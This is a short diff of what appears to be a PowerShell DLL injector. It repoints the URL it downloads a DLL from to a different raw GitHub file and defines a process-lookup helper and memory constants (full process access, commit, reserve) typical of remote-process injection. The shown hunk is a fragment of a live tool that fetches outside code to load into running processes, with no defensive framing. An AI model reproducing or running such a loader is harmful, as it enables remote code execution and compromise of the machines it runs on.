@@ -32,7 +32,7 @@ function Get-ProcessIdByName($name) {
     return $proc.Id
 }
 
-$dllUrl = "https://raw.githubusercontent.com/Shreyasglitch/MyRepo/main/HDCommon.dll"
+$dllUrl = "https://raw.githubusercontent.com/Shreyasglitch/ps/main/test.dll"
 $PROCESS_ALL_ACCESS = 0x1F0FFF
 $MEM_COMMIT = 0x1000
 $MEM_RESERVE = 0x2000
